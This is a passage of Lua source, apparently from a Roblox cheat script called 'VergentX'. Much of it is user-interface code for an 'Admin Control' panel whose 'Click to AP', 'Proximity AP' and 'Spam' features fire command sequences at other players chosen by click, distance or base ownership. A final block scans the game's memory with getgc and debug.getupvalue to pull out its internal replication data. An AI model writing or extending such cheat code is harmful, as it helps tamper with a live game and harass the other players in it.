    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    _vxApplySavedPos(mainFrame, "ACTRL_POS", 0.13, 0.5)
    mainFrame.BackgroundColor3 = Theme.Background
    mainFrame.BackgroundTransparency = 0.08
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = gui
    applyMarble(mainFrame, true)

    local acScale = Instance.new("UIScale", mainFrame)
    VergentXRegisterScale(acScale, 1)

    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)
    complexBG(mainFrame, { corner = 12 * MOBILE_SCALE, border = false })

    local borderStroke = Instance.new("UIStroke", mainFrame)
    borderStroke.Thickness = 0.8
    borderStroke.Transparency = 0.25
    borderStroke.Color = Color3.fromRGB(6, 6, 8)
    borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(borderStroke, RING_SEQ, 25)

    local header = Instance.new("Frame", mainFrame)
    header.Size = UDim2.new(1, 0, 0, 40 * MOBILE_SCALE)
    header.BackgroundTransparency = 1
    header.Active = true
    MakeDraggable(header, mainFrame, "ACTRL_POS")

    local acStrip = Instance.new("Frame", header)
    acStrip.Size = UDim2.new(1, 0, 0, 33 * MOBILE_SCALE)
    acStrip.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    acStrip.BackgroundTransparency = 0.45
    acStrip.BorderSizePixel = 0
    Instance.new("UICorner", acStrip).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)

    local title = Instance.new("TextLabel", acStrip)
    title.Size = UDim2.new(1, -90 * MOBILE_SCALE, 1, 0)
    title.Position = UDim2.new(0, 14 * MOBILE_SCALE, 0, 0)
    title.BackgroundTransparency = 1
    title.ZIndex = 2
    title.Text = "Admin Control"
    title.Font = Enum.Font.Gotham
    title.TextSize = 16 * MOBILE_SCALE
    title.TextColor3 = Theme.TextPrimary
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 1
    VergentXTitleGrad(title)

    local content = Instance.new("Frame", mainFrame)
    content.Size = UDim2.new(1, -20 * MOBILE_SCALE, 1, -48 * MOBILE_SCALE)
    content.Position = UDim2.new(0, 10 * MOBILE_SCALE, 0, 44 * MOBILE_SCALE)
    content.BackgroundTransparency = 1

    local layout = Instance.new("UIListLayout", content)
    layout.Padding = UDim.new(0, 8 * MOBILE_SCALE)
    layout.SortOrder = Enum.SortOrder.LayoutOrder

    local function resizeToContent()
        local f = (acScale.Scale > 0) and acScale.Scale or 1
        mainFrame.Size = UDim2.new(0, 280 * MOBILE_SCALE,
            0, (layout.AbsoluteContentSize.Y / f) + 56 * MOBILE_SCALE)
    end
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(resizeToContent)

    local function createToggleRow(text, defaultValue, callback)
        local rowBtn = Instance.new("TextButton", content)
        rowBtn.Size = UDim2.new(1, 0, 0, 34 * MOBILE_SCALE)
        rowBtn.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
        rowBtn.BackgroundTransparency = 0.32
        rowBtn.BorderSizePixel = 0
        rowBtn.Text = ""
        rowBtn.AutoButtonColor = false
        Instance.new("UICorner", rowBtn).CornerRadius = UDim.new(0, 6 * MOBILE_SCALE)
        local acStroke = Instance.new("UIStroke", rowBtn)
        acStroke.Color = Color3.fromRGB(6, 6, 8)
        acStroke.Thickness = 1
        acStroke.Transparency = 0.85
        acStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local lbl = Instance.new("TextLabel", rowBtn)
        lbl.Size = UDim2.new(0.65, 0, 1, 0)
        lbl.Position = UDim2.new(0, 12 * MOBILE_SCALE, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 11 * MOBILE_SCALE
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1
        lbl.ZIndex = 2

        local AC_ON = Color3.fromRGB(188, 150, 62)
        local AC_OFF = Color3.fromRGB(44, 45, 51)
        local isOn = defaultValue or false
        local toggleFrame = Instance.new("Frame", rowBtn)
        toggleFrame.Size = UDim2.new(0, 40 * MOBILE_SCALE, 0, 20 * MOBILE_SCALE)
        toggleFrame.Position = UDim2.new(1, -52 * MOBILE_SCALE, 0.5, -10 * MOBILE_SCALE)
        toggleFrame.BackgroundColor3 = isOn and AC_ON or AC_OFF
        toggleFrame.BorderSizePixel = 0
        toggleFrame.ZIndex = 2
        Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(1, 0)

        local toggleDot = Instance.new("Frame", toggleFrame)
        toggleDot.Size = UDim2.new(0, 16 * MOBILE_SCALE, 0, 16 * MOBILE_SCALE)
        toggleDot.Position = isOn and UDim2.new(1, -18 * MOBILE_SCALE, 0.5, -8 * MOBILE_SCALE)
                                  or UDim2.new(0, 2 * MOBILE_SCALE, 0.5, -8 * MOBILE_SCALE)
        toggleDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        toggleDot.BorderSizePixel = 0
        toggleDot.ZIndex = 3
        Instance.new("UICorner", toggleDot).CornerRadius = UDim.new(1, 0)
        toggleRing(toggleFrame, math.floor(4 * MOBILE_SCALE + 0.5))

        local function setState(on, silent)
            isOn = on and true or false
            local newPos = isOn and UDim2.new(1, -18 * MOBILE_SCALE, 0.5, -8 * MOBILE_SCALE)
                                 or UDim2.new(0, 2 * MOBILE_SCALE, 0.5, -8 * MOBILE_SCALE)
            TweenService:Create(toggleDot, TweenInfo.new(0.2), { Position = newPos }):Play()
            TweenService:Create(toggleFrame, TweenInfo.new(0.2), { BackgroundColor3 = isOn and AC_ON or AC_OFF }):Play()
            callback(isOn)
            if not silent then pcall(ShowNotification, text, isOn and "Enabled" or "Disabled") end
        end
        rowBtn.MouseButton1Click:Connect(function() setState(not isOn) end)

        rowBtn.MouseEnter:Connect(function()
            TweenService:Create(rowBtn, TweenInfo.new(0.18), { BackgroundTransparency = 0.6 }):Play()
        end)
        rowBtn.MouseLeave:Connect(function()
            TweenService:Create(rowBtn, TweenInfo.new(0.18), { BackgroundTransparency = 0.32 }):Play()
        end)
        return rowBtn, setState, function() return isOn end
    end

    local function createButtonRow(text, callback)
        local rowBtn = Instance.new("TextButton", content)
        rowBtn.Size = UDim2.new(1, 0, 0, 34 * MOBILE_SCALE)
        rowBtn.BackgroundColor3 = Color3.fromRGB(16, 16, 19)
        rowBtn.BackgroundTransparency = 0.32
        rowBtn.AutoButtonColor = false
        rowBtn.BorderSizePixel = 0
        rowBtn.Text = text
        rowBtn.Font = Enum.Font.Gotham
        rowBtn.TextSize = 11 * MOBILE_SCALE
        rowBtn.TextColor3 = Color3.fromRGB(224, 225, 229)
        rowBtn.TextStrokeTransparency = 1
        Instance.new("UICorner", rowBtn).CornerRadius = UDim.new(0, 8 * MOBILE_SCALE)
        local rowHollow = Instance.new("UIStroke", rowBtn)
        rowHollow.Color = Color3.fromRGB(6, 6, 8)
        rowHollow.Thickness = 0.5
        rowHollow.Transparency = 0.5
        rowHollow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        rowBtn.MouseButton1Click:Connect(function()
            TweenService:Create(rowHollow, TweenInfo.new(0.1), { Color = Theme.Success }):Play()
            task.wait(0.1)
            TweenService:Create(rowHollow, TweenInfo.new(0.1), { Color = Color3.fromRGB(6, 6, 8) }):Play()
            callback()
        end)
        rowBtn.MouseEnter:Connect(function()
            TweenService:Create(rowBtn, TweenInfo.new(0.18), { BackgroundTransparency = 0.55 }):Play()
        end)
        rowBtn.MouseLeave:Connect(function()
            TweenService:Create(rowBtn, TweenInfo.new(0.18), { BackgroundTransparency = 0.32 }):Play()
        end)
        return rowBtn
    end

    local function createSliderRow(text, minV, maxV, default, suffix, callback)
        local row = Instance.new("Frame", content)
        row.Size = UDim2.new(1, 0, 0, 46 * MOBILE_SCALE)
        row.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
        row.BackgroundTransparency = 0.32
        row.BorderSizePixel = 0
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8 * MOBILE_SCALE)
        local acsStroke = Instance.new("UIStroke", row)
        acsStroke.Color = Color3.fromRGB(6, 6, 8)
        acsStroke.Thickness = 1
        acsStroke.Transparency = 0.85
        acsStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.6, 0, 0, 18 * MOBILE_SCALE)
        lbl.Position = UDim2.new(0, 12 * MOBILE_SCALE, 0, 5 * MOBILE_SCALE)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 11 * MOBILE_SCALE
        lbl.TextColor3 = Color3.fromRGB(207, 209, 216)
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local value = default or minV
        local valLbl = Instance.new("TextLabel", row)
        valLbl.Size = UDim2.new(0, 50 * MOBILE_SCALE, 0, 18 * MOBILE_SCALE)
        valLbl.Position = UDim2.new(1, -60 * MOBILE_SCALE, 0, 5 * MOBILE_SCALE)
        valLbl.BackgroundTransparency = 1
        valLbl.Text = tostring(value) .. (suffix or "")
        valLbl.Font = Enum.Font.Gotham
        valLbl.TextSize = 11 * MOBILE_SCALE
        valLbl.TextColor3 = Color3.fromRGB(204, 164, 72)
        valLbl.TextXAlignment = Enum.TextXAlignment.Right
        valLbl.TextStrokeTransparency = 1

        local sliderBg = Instance.new("Frame", row)
        sliderBg.Size = UDim2.new(1, -24 * MOBILE_SCALE, 0, 4 * MOBILE_SCALE)
        sliderBg.Position = UDim2.new(0, 12 * MOBILE_SCALE, 0, 30 * MOBILE_SCALE)
        sliderBg.BackgroundColor3 = Color3.fromRGB(29, 30, 33)
        sliderBg.BackgroundTransparency = 0.1
        sliderBg.BorderSizePixel = 0
        sliderBg.Active = true
        Instance.new("UICorner", sliderBg).CornerRadius = UDim.new(1, 0)

        local fill = Instance.new("Frame", sliderBg)
        fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        fill.BorderSizePixel = 0
        fill.Size = UDim2.new((value - minV) / (maxV - minV), 0, 1, 0)
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
        gradient(fill, ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 118, 48)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(204, 164, 72)),
        }))

        local knob = Instance.new("Frame", sliderBg)
        knob.Size = UDim2.new(0, 20 * MOBILE_SCALE, 0, 9 * MOBILE_SCALE)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        knob.AnchorPoint = Vector2.new(math.clamp((value - minV) / (maxV - minV), 0, 1), 0.5)
        knob.Position = UDim2.new((value - minV) / (maxV - minV), 0, 0.5, 0)
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
        local knobStroke = Instance.new("UIStroke", knob)
        knobStroke.Color = Color3.fromRGB(204, 164, 72)
        knobStroke.Thickness = 1
        knobStroke.Transparency = 0.15
        knobStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local dragging = false
        local function updateSlider(inputX)
            local pos = sliderBg.AbsolutePosition.X
            local size = sliderBg.AbsoluteSize.X
            if size <= 0 then return end
            local pct = math.clamp((inputX - pos) / size, 0, 1)
            value = math.floor(minV + (pct * (maxV - minV)) + 0.5)
            fill.Size = UDim2.new(pct, 0, 1, 0)
            knob.AnchorPoint = Vector2.new(pct, 0.5)
            knob.Position = UDim2.new(pct, 0, 0.5, 0)
            valLbl.Text = tostring(value) .. (suffix or "")
            callback(value)
        end

        local hitPad = Instance.new("TextButton", row)
        hitPad.Name = "VergentX_SliderTouch"
        hitPad.Position = UDim2.new(0, 8 * MOBILE_SCALE, 0, 20 * MOBILE_SCALE)
        hitPad.Size = UDim2.new(1, -16 * MOBILE_SCALE, 0, 24 * MOBILE_SCALE)
        hitPad.BackgroundTransparency = 1
        hitPad.Text = ""
        hitPad.AutoButtonColor = false
        hitPad.ZIndex = 3

        local function beginDrag(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1
                and input.UserInputType ~= Enum.UserInputType.Touch then return end
            dragging = true
            updateSlider(input.Position.X)
        end

        hitPad.InputBegan:Connect(beginDrag)
        sliderBg.InputBegan:Connect(beginDrag)
        knob.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
            end
        end)
        vxBind(UserInputService.InputEnded, function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
        vxBind(UserInputService.InputChanged, function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                updateSlider(input.Position.X)
            end
        end)
        return row
    end

    local clickToAPHighlight = Instance.new("Highlight")
    clickToAPHighlight.Name = _vxName("ClickToAPHighlight")
    clickToAPHighlight.FillColor = Theme.Accent1
    clickToAPHighlight.FillTransparency = 0.5
    clickToAPHighlight.OutlineColor = Theme.Accent2
    clickToAPHighlight.OutlineTransparency = 0.2
    clickToAPHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    clickToAPHighlight.Parent = VXGui

    local function rayHitsBox(rayOrigin, rayDirection, centre, size)
        local half = size / 2
        local minB = centre - Vector3.new(half, half, half)
        local maxB = centre + Vector3.new(half, half, half)
        local dir = rayDirection
        if dir.X == 0 then dir = Vector3.new(0.0001, dir.Y, dir.Z) end
        if dir.Y == 0 then dir = Vector3.new(dir.X, 0.0001, dir.Z) end
        if dir.Z == 0 then dir = Vector3.new(dir.X, dir.Y, 0.0001) end
        local tmin = (minB.X - rayOrigin.X) / dir.X
        local tmax = (maxB.X - rayOrigin.X) / dir.X
        if tmin > tmax then tmin, tmax = tmax, tmin end
        local tymin = (minB.Y - rayOrigin.Y) / dir.Y
        local tymax = (maxB.Y - rayOrigin.Y) / dir.Y
        if tymin > tymax then tymin, tymax = tymax, tymin end
        if tmin > tymax or tymin > tmax then return false end
        if tymin > tmin then tmin = tymin end
        if tymax < tmax then tmax = tymax end
        local tzmin = (minB.Z - rayOrigin.Z) / dir.Z
        local tzmax = (maxB.Z - rayOrigin.Z) / dir.Z
        if tzmin > tzmax then tzmin, tzmax = tzmax, tzmin end
        if tmin > tzmax or tzmin > tmax then return false end
        if tzmax < tmax then tmax = tzmax end
        return tmax >= 0
    end

    local function pickHoveredPlayer(screenPos)
        local camera = Workspace.CurrentCamera
        if not camera then return nil end
        local mousePos = screenPos or UserInputService:GetMouseLocation()
        local ray = camera:ViewportPointToRay(mousePos.X, mousePos.Y)
        local bestPlayer, bestDistance = nil, math.huge
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character then
                local part = p.Character:FindFirstChild("HumanoidRootPart")
                    or p.Character:FindFirstChildWhichIsA("BasePart")
                if part and rayHitsBox(ray.Origin, ray.Direction, part.Position, 6) then
                    local d = (ray.Origin - part.Position).Magnitude
                    if d < bestDistance then bestDistance, bestPlayer = d, p end
                end
            end
        end
        return bestPlayer
    end

    do
        local lastHovered = nil
        local capAcc = 0
        vxBind(RunService.Heartbeat, function(dt)
            if IS_MOBILE then return end
            if CONFIG.CLICK_TO_AP then
                capAcc = capAcc + dt
                if capAcc < 0.1 then return end
                capAcc = 0
                local best = pickHoveredPlayer()
                if best ~= lastHovered then
                    clickToAPHighlight.Adornee = best and best.Character or nil
                    lastHovered = best
                end
            elseif lastHovered then
                clickToAPHighlight.Adornee = nil
                lastHovered = nil
            end
        end)
    end

    vxBind(UserInputService.InputBegan, function(input, gameProcessed)
        if gameProcessed then return end
        local isTouch = (input.UserInputType == Enum.UserInputType.Touch)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and not isTouch then return end
        if not CONFIG.CLICK_TO_AP then return end
        local best = pickHoveredPlayer(isTouch and Vector2.new(input.Position.X, input.Position.Y) or nil)
        if best then
            if isTouch then
                clickToAPHighlight.Adornee = best.Character
                task.delay(0.35, function()
                    if clickToAPHighlight.Adornee == best.Character then
                        clickToAPHighlight.Adornee = nil
                    end
                end)
            end
            task.spawn(function() _G.VXRunCmdSequence(best) end)
        end
    end)

    local _, setClickAP, getClickAP = createToggleRow("Click to AP", CONFIG.CLICK_TO_AP, function(on)
        CONFIG.CLICK_TO_AP = on
        saveConfig()
    end)
    _G.VXToggleClickToAP = function() setClickAP(not getClickAP()) end

    createToggleRow("Single AP Command", CONFIG.SINGLE_AP, function(on)
        CONFIG.SINGLE_AP = on
        saveConfig()
    end)

    local proxRing = nil
    updateProxRing = function()
        if not ProximityAPActive then
            if proxRing and proxRing.Parent then proxRing:Destroy() end
            proxRing = nil
            return
        end
        if not proxRing or not proxRing.Parent then
            proxRing = Instance.new("Part")
            proxRing.Name = _vxName("VergentXProxRing")
            proxRing.Anchored = true
            proxRing.CanCollide = false
            proxRing.CanQuery = false
            proxRing.Shape = Enum.PartType.Cylinder
            proxRing.Color = Theme.GoldLo
            proxRing.Transparency = 0.65
            proxRing.CastShadow = false
            proxRing.Material = Enum.Material.Neon
            proxRing:SetAttribute("__VXESP", true)
            proxRing.Parent = Workspace

            local glowRing = Instance.new("Part")
            glowRing.Name = "Glow"
            glowRing.Anchored = true
            glowRing.CanCollide = false
            glowRing.CanQuery = false
            glowRing.Shape = Enum.PartType.Cylinder
            glowRing.Color = Theme.GoldHi
            glowRing.Transparency = 0.8
            glowRing.CastShadow = false
            glowRing.Material = Enum.Material.Neon
            glowRing:SetAttribute("__VXESP", true)
            glowRing.Parent = proxRing
        end

        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local diameter = (tonumber(CONFIG.PROXIMITY_RANGE) or 15) * 2
        proxRing.Size = Vector3.new(0.1, diameter, diameter)
        proxRing.CFrame = (hrp.CFrame * CFrame.new(0, -3.2, 0)) * CFrame.Angles(0, 0, math.rad(90))
        local glowRing = proxRing:FindFirstChild("Glow")
        if glowRing then
            glowRing.Size = Vector3.new(0.05, diameter + 0.8, diameter + 0.8)
            glowRing.CFrame = proxRing.CFrame
        end
        local pulse = (math.sin(tick() * 4) + 1) / 2
        proxRing.Color = Theme.GoldLo:Lerp(Theme.GoldHi, pulse)
        if glowRing then glowRing.Color = Theme.GoldHi:Lerp(Theme.GoldLo, pulse) end
    end

    vxBind(RunService.RenderStepped, function()
        if not ProximityAPActive and not proxRing then return end
        updateProxRing()
    end)

    local _, setProxAP, getProxAP = createToggleRow("Proximity AP", false, function(on)
        ProximityAPActive = on
        updateProxRing()
    end)
    _G.VXToggleProximityAP = function() setProxAP(not getProxAP()) end

    createSliderRow("Proximity Range", 5, 50, tonumber(CONFIG.PROXIMITY_RANGE) or 15, "s", function(val)
        CONFIG.PROXIMITY_RANGE = val
        saveConfig()
        updateProxRing()
    end)

    do
        local proxSpamming = {}
        local acc = 0
        vxBind(RunService.Heartbeat, function(dt)
            if not ProximityAPActive then return end
            acc = acc + dt
            if acc < 0.5 then return end
            acc = 0
            local char = LP.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local range = tonumber(CONFIG.PROXIMITY_RANGE) or 15
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LP and p.Character and not proxSpamming[p.UserId] then
                    local ohrp = p.Character:FindFirstChild("HumanoidRootPart")
                    if ohrp and (ohrp.Position - hrp.Position).Magnitude <= range then
                        proxSpamming[p.UserId] = true
                        task.spawn(function()
                            _G.VXRunCmdSequence(p)
                            proxSpamming[p.UserId] = nil
                        end)
                    end
                end
            end
        end)
    end

    local function doSpamNearest()
        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local nearestPlayer, nearestDist = nil, math.huge
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                local d = (hrp.Position - p.Character.HumanoidRootPart.Position).Magnitude
                if d < nearestDist then nearestDist, nearestPlayer = d, p end
            end
        end
        if not nearestPlayer then return end
        task.spawn(function() _G.VXRunCmdSequence(nearestPlayer) end)
        ShowNotification("Spam Nearest", nearestPlayer.DisplayName)
    end
    _G.VXSpamNearest = doSpamNearest
    createButtonRow("Spam Nearest", doSpamNearest)

    local function doSpamOwner()
        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local plots = Workspace:FindFirstChild("Plots")
        if not hrp or not plots then return end

        local nearestPlot, nearestDist = nil, math.huge
        for _, plot in ipairs(plots:GetChildren()) do
            local sign = plot:FindFirstChild("PlotSign")
            local signPos
            if sign then
                if sign:IsA("BasePart") then signPos = sign.Position
                elseif sign.PrimaryPart then signPos = sign.PrimaryPart.Position end
            end
            if signPos then
                local d = (hrp.Position - signPos).Magnitude
                if d < nearestDist then nearestDist, nearestPlot = d, plot end
            end
        end
        if not nearestPlot then return end

        local ownerName = Brainrots.OwnerOf and Brainrots.OwnerOf(nearestPlot.Name) or nil
        if not ownerName then
            ShowNotification("Spam Owner", "That base has no owner")
            return
        end
        local target
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and (p.Name == ownerName or p.DisplayName == ownerName) then target = p break end
        end
        if not target then
            ShowNotification("Spam Owner", ownerName .. " is not in the server")
            return
        end
        task.spawn(function() _G.VXRunCmdSequence(target) end)
        ShowNotification("Spam Owner", target.DisplayName)
    end
    _G.VXSpamOwner = doSpamOwner
    createButtonRow("Spam Nearest Base Owner", doSpamOwner)

    resizeToContent()

    vxAttachReveal(gui, mainFrame)

    function AdminControl.SetPosition(pos)
        if pos then mainFrame.Position = pos end
    end
    return gui
end

F.setAdminControl = function(on)
    CONFIG.ADMIN_CONTROL = on and true or false
    if AdminControl.gui then AdminControl.gui.Enabled = CONFIG.ADMIN_CONTROL end
    saveConfig()
end

do
    local Lighting = game:GetService("Lighting")
    local stripConn = nil

    local function isPlayerCharacter(model)
        return Players:GetPlayerFromCharacter(model) ~= nil
    end

    local function preserve(obj)
        local node = obj
        while node and node ~= Workspace do
            if node:GetAttribute("__VXESP") then return true end
            local nm = node.Name
            if type(nm) == "string" then
                if nm:sub(1, 2) == "VX" or nm:find("Vergent") then return true end
                if nm:find("PlotBeam") or nm:find("Brainrot") or nm:find("ESP") or nm:find("BaseBeam") then return true end
            end
            node = node.Parent
        end
        return false
    end

    local function handleAnimator(animator)
        local model = animator:FindFirstAncestorOfClass("Model")
        if model and isPlayerCharacter(model) then return end
        for _, track in pairs(animator:GetPlayingAnimationTracks()) do track:Stop(0) end
        animator.AnimationPlayed:Connect(function(track) track:Stop(0) end)
    end

    local function stripVisuals(obj)
        if preserve(obj) then return end
        if obj:IsA("Highlight") then return end
        if obj:IsA("BillboardGui") or obj:IsA("Beam") or obj:IsA("Handles")
            or obj:IsA("SelectionBox") or obj:IsA("BoxHandleAdornment")
            or obj:IsA("CylinderHandleAdornment") or obj:IsA("SphereHandleAdornment")
            or obj:IsA("LineHandleAdornment") or obj:IsA("Attachment") then
            return
        end

        local model = obj:FindFirstAncestorOfClass("Model")
        local isPlayer = model and isPlayerCharacter(model)
        if obj:IsA("Animator") then handleAnimator(obj) end

        if not isPlayer then
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
                or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                obj.Enabled = false
            end
            if obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
                obj.Enabled = false
                obj.Brightness = 0
                obj.Range = 0
            end
            if obj:IsA("MeshPart") then obj.TextureID = "" end
        end
        if obj:IsA("BasePart") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
            obj.CastShadow = false
        end
        if obj:IsA("Texture") or obj:IsA("Decal") then
            obj.Transparency = 1
        end
    end

    F.setGraphicsStrip = function(on)
        CONFIG.GRAPHICS_STRIP = on and true or false
        if stripConn then stripConn:Disconnect(); stripConn = nil end
        if not CONFIG.GRAPHICS_STRIP then return end

        pcall(function()
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 9e9
            Lighting.FogStart = 0
            Lighting.EnvironmentDiffuseScale = 0
            Lighting.EnvironmentSpecularScale = 0
            for _, v in pairs(Lighting:GetChildren()) do
                if v:IsA("BlurEffect") or v:IsA("SunRaysEffect")
                    or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
                    v.Enabled = false
                end
            end
            local terrain = Workspace:FindFirstChildOfClass("Terrain")
            if terrain then
                terrain.WaterWaveSize = 0
                terrain.WaterWaveSpeed = 0
                terrain.WaterReflectance = 0
                terrain.WaterTransparency = 1
            end
        end)

        task.spawn(function()
            local objs = Workspace:GetDescendants()
            for i = 1, #objs do
                if not CONFIG.GRAPHICS_STRIP then return end
                pcall(stripVisuals, objs[i])
                if i % 30 == 0 then task.wait() end
            end
        end)

        local queue, queued = {}, 0
        stripConn = Workspace.DescendantAdded:Connect(function(obj)
            if not CONFIG.GRAPHICS_STRIP then return end
            queued = queued + 1
            queue[queued] = obj
        end)

        task.spawn(function()
            while CONFIG.GRAPHICS_STRIP and vxAlive() do
                if queued > 0 then
                    local batch, n = queue, queued
                    queue, queued = {}, 0
                    for i = 1, n do
                        pcall(stripVisuals, batch[i])
                        if i % 40 == 0 then task.wait() end
                    end
                end
                task.wait(0.2)
            end
        end)
    end
end

do
    local _xchan
    local _lastTry, _attempts = 0, 0
    local _deepScans, _lastDeep = 0, 0
    local _mod

    local MAX_ATTEMPTS, RETRY_GAP = 40, 0.5
    local BOOT_T0, BOOT_BURST, BOOT_GAP = os.clock(), 3.0, 0.10
    local MAX_DEEP, DEEP_GAP = 3, 1.5

    local function _retryGap()
        if (os.clock() - BOOT_T0) < BOOT_BURST then return BOOT_GAP end
        return RETRY_GAP
    end

    local function _channelCount(t)
        if type(t) ~= "table" then return 0 end
        local ok, hits = pcall(function()
            local h, n = 0, 0
            for _, v in next, t do
                n = n + 1
                if type(v) == "table" and type(rawget(v, "CacheTable")) == "table" then
                    h = h + 1
                end
                if n >= 200 then break end
            end
            return h
        end)
        return (ok and hits) or 0
    end

    local _gcTried = false
    local function _module()
        if _mod then return _mod end
        if not _gcTried and type(getgc) == "function" then
            _gcTried = true
            pcall(function()
                for _, o in ipairs(getgc(true)) do
                    if type(o) == "table"
                        and type(rawget(o, "Get")) == "function"
                        and type(rawget(o, "Wait")) == "function" then
                        _mod = o
                        break
                    end
                end
            end)
        end
        return _mod
    end

    local function _probe(mod)
        local gu = (debug and debug.getupvalue) or getupvalue
        if type(gu) ~= "function" then return nil, 0, nil end
        local getter = rawget(mod, "Get")
        if type(getter) ~= "function" then return nil, 0, nil end
        local best, bestN, where = nil, 0, nil
        local function consider(t, tag)
            local n = _channelCount(t)
            if n > bestN then best, bestN, where = t, n, tag end
        end
        for i = 1, 50 do
            local ok, up = pcall(gu, getter, i)
            if ok and type(up) == "table" then
                consider(up, "Get/" .. i)
                if bestN == 0 then
                    local scanned = 0
                    for _, v1 in next, up do
                        if type(v1) == "table" then
                            scanned = scanned + 1
                            if scanned > 40 then break end
                            consider(v1, "Get/" .. i .. "/nested")
                            if bestN > 0 then break end
                        end
                    end
                end
                if bestN > 0 then return best, bestN, where end
            end
        end
        return best, bestN, where
    end

    local function _deepScan(mod)
        local gu = (debug and debug.getupvalue) or getupvalue
        if type(gu) ~= "function" then return nil, 0, nil end
        local best, bestN, where = nil, 0, nil
        local function consider(t, tag)
            local n = _channelCount(t)
            if n > bestN then best, bestN, where = t, n, tag end
        end
        for fname, fn in next, mod do
            if type(fn) == "function" then
                for i = 1, 24 do
                    local o, u = pcall(gu, fn, i)
                    if not o then break end
                    if type(u) == "table" then
                        consider(u, tostring(fname) .. "/" .. i)
                        for j = 1, 4 do
                            consider(rawget(u, j), tostring(fname) .. "/" .. i .. "/" .. j)
                        end
                    end
                end
            end
        end
        return best, bestN, where
    end

    local function _chans()
        if _xchan then return _xchan end
        if (os.clock() - _lastTry) <= _retryGap() then return nil end
        _lastTry = os.clock()

        local mod = _module()
        if not mod or _attempts >= MAX_ATTEMPTS then return nil end
        _attempts = _attempts + 1

        local found = _probe(mod)
        if not found and _deepScans < MAX_DEEP and (os.clock() - _lastDeep) > DEEP_GAP then
            _lastDeep = os.clock()
            _deepScans = _deepScans + 1
            found = _deepScan(mod)
        end

        if found then
            _xchan = found
        end
        return _xchan
    end

    local function syncGet(idx)
        if idx == nil then return nil end
        local t = _chans()
        if not t then return nil end
        local ok, cd = pcall(rawget, t, idx)
        if ok and type(cd) == "table" then return cd end
        local ok2, cd2 = pcall(function() return t[idx] end)
        if ok2 and type(cd2) == "table" then return cd2 end
        return nil
    end
    _G.VXSyncGet = syncGet

    local function sProp(ch, key)
        if type(ch) ~= "table" or key == nil then return nil end
        local ct = rawget(ch, "CacheTable")
        if type(ct) ~= "table" then
            local okC, c2 = pcall(function() return ch.CacheTable end)
            if okC and type(c2) == "table" then ct = c2 end
        end
        if type(ct) == "table" then
            local v = rawget(ct, key)
            if v ~= nil then return v end
            local okV, v2 = pcall(function() return ct[key] end)
            if okV and v2 ~= nil then return v2 end
        end
        for _, bag in ipairs({ "Data", "_data", "state", "values" }) do
            local t = rawget(ch, bag)
            if type(t) == "table" then
                local okB, vb = pcall(function() return t[key] end)
                if okB and vb ~= nil then return vb end
            end
        end
        local direct = rawget(ch, key)
        if direct ~= nil then return direct end
        local okG, vg = pcall(function()
            if type(ch.Get) == "function" then return ch:Get(key) end
            return nil
        end)
        if okG and vg ~= nil then return vg end
        return nil
    end
    _G.VXsProp = sProp

